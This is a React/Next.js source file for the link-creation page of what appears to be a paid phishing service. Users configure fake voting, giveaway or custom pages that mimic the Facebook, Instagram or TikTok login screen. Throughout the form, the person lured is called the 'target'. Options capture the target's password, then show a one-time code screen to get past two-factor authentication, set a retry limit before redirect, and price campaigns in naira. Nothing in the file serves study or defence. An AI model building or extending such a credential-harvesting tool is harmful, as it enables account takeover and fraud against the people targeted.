'use client';

import { useState, useEffect } from 'react';
import { toast } from 'react-hot-toast';
import { useRouter } from 'next/navigation';
import {
  TrophyIcon,
  GiftIcon,
  Cog6ToothIcon,
  CheckCircleIcon,
  XCircleIcon,
} from '@heroicons/react/24/outline';
import ImageUpload from '@/components/ImageUpload';

type LinkType = 'voting' | 'giveaway' | 'custom';
type SocialPlatform = 'facebook' | 'instagram' | 'tiktok';

interface FormData {
  type: LinkType;
  image: string;
  bannerImage: string;
  linkName: string;
  title: string;
  contestantName: string;
  writeup: string;
  platforms: SocialPlatform[];
  duration: number;
  askForOtp: boolean;
  retry: number;
}

interface FormErrors {
  linkName?: string;
  title?: string;
  contestantName?: string;
  writeup?: string;
  image?: string;
  bannerImage?: string;
}

const TYPE_CARDS: { type: LinkType; icon: React.ElementType; color: string; label: string; description: string }[] = [
  {
    type: 'voting',
    icon: TrophyIcon,
    color: 'text-blue-500',
    label: 'Voting',
    description: 'A contest page where the target votes for a specific contestant.',
  },
  {
    type: 'giveaway',
    icon: GiftIcon,
    color: 'text-green-500',
    label: 'Giveaway',
    description: 'A prize page that asks the target to log in to claim a reward.',
  },
  {
    type: 'custom',
    icon: Cog6ToothIcon,
    color: 'text-purple-500',
    label: 'Custom',
    description: 'A generic page with your own title and description.',
  },
];

const PLATFORM_LABELS: Record<SocialPlatform, string> = {
  facebook: 'Facebook',
  instagram: 'Instagram',
  tiktok: 'TikTok',
};

const DURATION_OPTIONS = [
  { value: 0.5, label: '1 Day' },
  { value: 1,   label: '1 Week' },
  { value: 2,   label: '2 Weeks' },
  { value: 4,   label: '1 Month' },
  { value: 8,   label: '2 Months' },
  { value: 12,  label: '3 Months' },
];

function SectionHeader({ children }: { children: React.ReactNode }) {
  return (
    <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500 mb-3">
      {children}
    </p>
  );
}

function HelperText({ children }: { children: React.ReactNode }) {
  return (
    <p className="text-xs text-gray-500 dark:text-gray-400 mt-1 leading-relaxed">{children}</p>
  );
}

export default function SocialGeneratePage() {
  const [formData, setFormData] = useState<FormData>({
    type: 'voting',
    image: '',
    bannerImage: '',
    linkName: '',
    title: '',
    contestantName: '',
    writeup: '',
    platforms: ['facebook'],
    duration: 1,
    askForOtp: true,
    retry: 1,
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [userPoints, setUserPoints] = useState<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => setUserPoints(d.user?.points ?? null))
      .catch(() => {});
  }, []);

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {};

    if (!formData.linkName.trim()) {
      newErrors.linkName = 'Link name is required';
    } else if (formData.linkName.length > 50) {
      newErrors.linkName = 'Link name must be less than 50 characters';
    }

    if (formData.type === 'giveaway' || formData.type === 'custom') {
      if (!formData.title.trim()) {
        newErrors.title = 'Title is required';
      } else if (formData.title.length > 100) {
        newErrors.title = 'Title must be less than 100 characters';
      }
    }

    if (formData.type === 'voting') {
      if (!formData.contestantName.trim()) {
        newErrors.contestantName = 'Contestant name is required';
      } else if (formData.contestantName.length > 50) {
        newErrors.contestantName = 'Contestant name must be less than 50 characters';
      }
    }

    if (!formData.writeup.trim()) {
      newErrors.writeup = 'Writeup is required';
    } else if (formData.writeup.length > 500) {
      newErrors.writeup = 'Writeup must be less than 500 characters';
    }

    if (!formData.image.trim()) {
      newErrors.image = 'Image URL is required';
    }

    if (formData.type === 'voting' || formData.type === 'giveaway') {
      if (!formData.bannerImage.trim()) {
        newErrors.bannerImage = 'Banner image URL is required';
      }
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm() || isSubmitting) {
      return;
    }

    setIsSubmitting(true);

    try {
      const response = await fetch('/api/auth/links/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: formData.type,
          linkName: formData.linkName,
          title: formData.title,
          contestantName: formData.contestantName,
          writeup: formData.writeup,
          platforms: formData.platforms,
          duration: formData.duration,
          image: formData.image,
          bannerImage: formData.bannerImage,
          askForOtp: formData.askForOtp,
          retry: formData.retry,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to generate link');
      }

      toast.success('Link generated successfully!');
      router.push('/links');
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error(error instanceof Error ? error.message : 'Failed to generate link');
      setIsSubmitting(false);
    }
  };

  const handleTypeChange = (type: LinkType) => {
    setFormData(prev => ({
      ...prev,
      type,
      title: type === 'voting' ? '' : prev.title,
      contestantName: type !== 'voting' ? '' : prev.contestantName,
      image: prev.image,
      bannerImage: prev.bannerImage,
      platforms: prev.platforms,
      duration: prev.duration,
    }));
    setErrors(prev => ({ ...prev, title: undefined, contestantName: undefined }));
  };

  const handlePlatformToggle = (platform: SocialPlatform) => {
    setFormData(prev => {
      if (prev.platforms.includes(platform) && prev.platforms.length > 1) {
        return { ...prev, platforms: prev.platforms.filter(p => p !== platform) };
      } else if (!prev.platforms.includes(platform)) {
        return { ...prev, platforms: [...prev.platforms, platform] };
      }
      return prev;
    });
  };

  const calculatePrice = () => {
    const basePrice = 4000;
    const additionalPrice = 2500;
    const additionalPlatforms = formData.platforms.length - 1;
    const effectiveBasePrice = formData.duration === 0.5 ? basePrice / 2 : basePrice;
    const platformTotal = effectiveBasePrice + (additionalPlatforms > 0 ? additionalPlatforms * additionalPrice : 0);
    const durationMultipliers: Record<number, number> = {
      0.5: 1, 1: 1, 2: 2, 4: 4, 8: 7, 12: 10,
    };
    const isDurationValid = (d: number): d is keyof typeof durationMultipliers => d in durationMultipliers;
    return platformTotal * (isDurationValid(formData.duration) ? durationMultipliers[formData.duration] : 1);
  };

  const price = calculatePrice();
  const canAfford = userPoints === null ? true : userPoints >= price;

  /* ── shared input class ── */
  const inputCls = (error?: string) =>
    `w-full px-3.5 py-2.5 bg-gray-50 dark:bg-gray-800 border rounded-lg text-sm text-gray-900 dark:text-white placeholder:text-gray-400 dark:placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-primary-500/40 focus:border-primary-500 transition-all duration-150 ${
      error
        ? 'border-red-400 dark:border-red-500'
        : 'border-gray-200 dark:border-gray-700'
    }`;

  const pillCls = (active: boolean) =>
    `px-4 py-2 rounded-full text-sm font-semibold transition-colors duration-150 ${
      active
        ? 'bg-primary-500 text-white'
        : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
    }`;

  return (
    <div className="max-w-2xl mx-auto px-4 py-6 space-y-8">
      <div>
        <h1 className="text-xl font-bold text-gray-900 dark:text-white">Create Social Media Link</h1>
        <p className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">
          Fill in the details below — each field is explained to guide you.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-8">

        {/* ── Section 1: Link Type ── */}
        <section className="space-y-3">
          <SectionHeader>1 — Choose a link type</SectionHeader>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            {TYPE_CARDS.map(({ type, icon: Icon, color, label, description }) => {
              const active = formData.type === type;
              return (
                <button
                  key={type}
                  type="button"
                  onClick={() => handleTypeChange(type)}
                  className={`text-left p-4 rounded-xl border-2 transition-all duration-150 ${
                    active
                      ? 'border-primary-500 bg-primary-500/5'
                      : 'border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 hover:border-gray-300 dark:hover:border-gray-600'
                  }`}
                >
                  <Icon className={`w-6 h-6 mb-2 ${color}`} />
                  <p className="text-sm font-semibold text-gray-900 dark:text-white mb-1">{label}</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed">{description}</p>
                </button>
              );
            })}
          </div>
        </section>

        {/* ── Section 2: Link Details ── */}
        <section className="space-y-4">
          <SectionHeader>2 — Link details</SectionHeader>

          {/* Reference name — always shown */}
          <div>
            <label htmlFor="linkName" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Your reference name
            </label>
            <input
              type="text"
              id="linkName"
              value={formData.linkName}
              onChange={(e) => {
                setFormData({ ...formData, linkName: e.target.value });
                if (errors.linkName) setErrors(prev => ({ ...prev, linkName: undefined }));
              }}
              className={inputCls(errors.linkName)}
              placeholder="e.g. John's voting campaign"
              maxLength={50}
            />
            <HelperText>Only you see this — used to identify the link in your dashboard.</HelperText>
            {errors.linkName && <p className="text-xs text-red-500 mt-1">{errors.linkName}</p>}
          </div>

          {/* Contestant Name — voting only */}
          {formData.type === 'voting' && (
            <div>
              <label htmlFor="contestantName" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                Contestant&apos;s name
              </label>
              <input
                type="text"
                id="contestantName"
                value={formData.contestantName}
                onChange={(e) => {
                  setFormData({ ...formData, contestantName: e.target.value });
                  if (errors.contestantName) setErrors(prev => ({ ...prev, contestantName: undefined }));
                }}
                className={inputCls(errors.contestantName)}
                placeholder="e.g. Sarah Johnson"
                maxLength={50}
              />
              <HelperText>This name appears on the voting page your target sees.</HelperText>
              {errors.contestantName && <p className="text-xs text-red-500 mt-1">{errors.contestantName}</p>}
            </div>
          )}

          {/* Title — giveaway & custom */}
          {(formData.type === 'giveaway' || formData.type === 'custom') && (
            <div>
              <label htmlFor="title" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                Page title
              </label>
              <input
                type="text"
                id="title"
                value={formData.title}
                onChange={(e) => {
                  setFormData({ ...formData, title: e.target.value });
                  if (errors.title) setErrors(prev => ({ ...prev, title: undefined }));
                }}
                className={inputCls(errors.title)}
                placeholder="e.g. You've been selected for a giveaway!"
                maxLength={100}
              />
              <HelperText>The headline shown at the top of the page your target sees.</HelperText>
              {errors.title && <p className="text-xs text-red-500 mt-1">{errors.title}</p>}
            </div>
          )}

          {/* Description / Writeup */}
          <div>
            <label htmlFor="writeup" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Description
            </label>
            <textarea
              id="writeup"
              rows={4}
              value={formData.writeup}
              onChange={(e) => {
                setFormData({ ...formData, writeup: e.target.value });
                if (errors.writeup) setErrors(prev => ({ ...prev, writeup: undefined }));
              }}
              className={inputCls(errors.writeup)}
              placeholder="A short message shown on the page. Make it sound believable and relevant to the scenario."
              maxLength={500}
            />
            <div className="flex justify-between items-start mt-1">
              <HelperText>Shown on the page as supporting text. Tip: keep it specific and natural-sounding.</HelperText>
              <span className="text-xs text-gray-400 dark:text-gray-500 shrink-0 ml-2">{formData.writeup.length}/500</span>
            </div>
            {errors.writeup && <p className="text-xs text-red-500 mt-1">{errors.writeup}</p>}
          </div>
        </section>

        {/* ── Section 3: Images ── */}
        <section className="space-y-4">
          <SectionHeader>3 — Images</SectionHeader>

          <ImageUpload
            label="Main image"
            required
            value={formData.image}
            onChange={(url) => {
              setFormData(prev => ({ ...prev, image: url }));
              if (errors.image) setErrors(prev => ({ ...prev, image: undefined }));
            }}
            hint="The profile or contestant photo shown on the page."
            error={errors.image}
          />

          {(formData.type === 'voting' || formData.type === 'giveaway') && (
            <ImageUpload
              label="Banner image"
              required
              value={formData.bannerImage}
              onChange={(url) => {
                setFormData(prev => ({ ...prev, bannerImage: url }));
                if (errors.bannerImage) setErrors(prev => ({ ...prev, bannerImage: undefined }));
              }}
              hint="Wide header image shown at the top of the page."
              error={errors.bannerImage}
            />
          )}
        </section>

        {/* ── Section 4: Platforms & Security ── */}
        <section className="space-y-5">
          <SectionHeader>4 — Platforms &amp; security</SectionHeader>

          {/* Platforms */}
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Target platforms
            </label>
            <HelperText>The page will mimic the login screen of the selected platform(s).</HelperText>
            <div className="flex flex-wrap gap-2 mt-2.5">
              {(['facebook', 'instagram', 'tiktok'] as SocialPlatform[]).map((platform) => (
                <button
                  key={platform}
                  type="button"
                  onClick={() => handlePlatformToggle(platform)}
                  className={pillCls(formData.platforms.includes(platform))}
                >
                  {PLATFORM_LABELS[platform]}
                </button>
              ))}
            </div>
            {formData.platforms.length > 1 && (
              <p className="text-xs text-amber-600 dark:text-amber-400 mt-2">
                +{formData.platforms.length - 1} extra platform{formData.platforms.length > 2 ? 's' : ''} — adds ₦{((formData.platforms.length - 1) * 2500).toLocaleString()} to the base price.
              </p>
            )}
          </div>

          {/* Divider */}
          <div className="border-t border-gray-100 dark:border-gray-700" />

          {/* OTP */}
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Request OTP after login?
            </label>
            <HelperText>
              If yes, after entering their password the target is shown a one-time code verification screen.
            </HelperText>
            <div className="flex gap-2 mt-2.5">
              {[{ value: true, label: 'Yes' }, { value: false, label: 'No' }].map((option) => (
                <button
                  key={option.label}
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, askForOtp: option.value }))}
                  className={pillCls(formData.askForOtp === option.value)}
                >
                  {option.label}
                </button>
              ))}
            </div>
          </div>

          {/* Retries */}
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Login attempts allowed
            </label>
            <HelperText>
              After this many failed login attempts, the target is redirected away from the page.
            </HelperText>
            <div className="flex gap-2 mt-2.5">
              {[1, 2, 3].map((value) => (
                <button
                  key={value}
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, retry: value }))}
                  className={pillCls(formData.retry === value)}
                >
                  {value}
                </button>
              ))}
            </div>
          </div>
        </section>

        {/* ── Section 5: Duration & Cost ── */}
        <section className="space-y-4">
          <SectionHeader>5 — Duration &amp; cost</SectionHeader>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              How long should the link stay active?
            </label>
            <div className="flex flex-wrap gap-2 mt-2">
              {DURATION_OPTIONS.map((option) => (
                <button
                  key={option.value}
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, duration: option.value }))}
                  className={pillCls(formData.duration === option.value)}
                >
                  {option.label}
                </button>
              ))}
            </div>
          </div>

          {/* Cost summary card */}
          <div className="rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 overflow-hidden">
            <div className="px-4 py-3 border-b border-gray-100 dark:border-gray-700">
              <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500">
                Cost summary
              </p>
            </div>
            <div className="px-4 py-3 space-y-2">
              <div className="flex justify-between text-sm text-gray-600 dark:text-gray-400">
                <span>Base ({formData.duration === 0.5 ? '1-day rate' : '1-week rate'})</span>
                <span>₦{(formData.duration === 0.5 ? 2000 : 4000).toLocaleString()}</span>
              </div>
              {formData.platforms.length > 1 && (
                <div className="flex justify-between text-sm text-gray-600 dark:text-gray-400">
                  <span>Extra platforms (×{formData.platforms.length - 1})</span>
                  <span>+₦{((formData.platforms.length - 1) * 2500).toLocaleString()}</span>
                </div>
              )}
              {(() => {
                const durationMultipliers: Record<number, number> = {
                  0.5: 1, 1: 1, 2: 2, 4: 4, 8: 7, 12: 10,
                };
                const mult = durationMultipliers[formData.duration] ?? 1;
                return mult > 1 ? (
                  <div className="flex justify-between text-sm text-gray-600 dark:text-gray-400">
                    <span>Duration multiplier</span>
                    <span>×{mult}</span>
                  </div>
                ) : null;
              })()}
              <div className="border-t border-gray-100 dark:border-gray-700 pt-2 flex justify-between">
                <span className="text-sm font-semibold text-gray-900 dark:text-white">Total</span>
                <span className="text-base font-bold text-primary-500">₦{price.toLocaleString()}</span>
              </div>
              {userPoints !== null && (
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500 dark:text-gray-400">Your balance</span>
                  <span className={`font-medium ${canAfford ? 'text-gray-700 dark:text-gray-300' : 'text-red-500'}`}>
                    ₦{userPoints.toLocaleString()}
                  </span>
                </div>
              )}
            </div>
            {userPoints !== null && (
              <div className={`px-4 py-2.5 flex items-center gap-2 ${canAfford ? 'bg-green-50 dark:bg-green-500/10' : 'bg-red-50 dark:bg-red-500/10'}`}>
                {canAfford ? (
                  <>
                    <CheckCircleIcon className="w-4 h-4 text-green-500 shrink-0" />
                    <span className="text-xs font-medium text-green-700 dark:text-green-400">You can afford this</span>
                  </>
                ) : (
                  <>
                    <XCircleIcon className="w-4 h-4 text-red-500 shrink-0" />
                    <span className="text-xs font-medium text-red-600 dark:text-red-400">
                      Insufficient balance — top up ₦{(price - userPoints).toLocaleString()} more to proceed.
                    </span>
                  </>
                )}
              </div>
            )}
          </div>
        </section>

        {/* ── Submit ── */}
        <button
          type="submit"
          disabled={isSubmitting || !canAfford}
          className="w-full py-3 px-4 rounded-xl font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors duration-150 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
        >
          {isSubmitting ? (
            <>
              <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
              </svg>
              Generating…
            </>
          ) : (
            'Generate Link'
          )}
        </button>
      </form>
    </div>
  );
}
